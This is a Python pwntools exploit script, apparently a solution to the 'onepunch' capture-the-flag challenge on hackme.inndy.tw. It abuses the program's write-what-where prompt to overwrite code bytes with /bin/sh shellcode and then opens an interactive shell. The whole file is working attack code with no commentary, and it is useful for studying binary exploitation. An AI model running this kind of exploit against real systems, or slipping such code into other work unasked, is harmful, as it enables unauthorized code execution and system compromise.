from pwn import *
context(arch = 'x86_64')

p = process('./onepunch',env = {"LD_PRELOAD":"../libc-2.23.so.x86_64"})
#p = remote('hackme.inndy.tw',7718)

def patch(addr,content):
	p.recvuntil('Where What?')
	p.sendline('%s %s'%(hex(addr),content))


patch(0x400768,0xb4)
shellcode = asm(shellcraft.sh())
#print disasm(shellcode)

addr = 0x400769
for i,j in enumerate(shellcode):
	patch(addr + i,ord(j))

patch(0x400000,0xff)

p.interactive()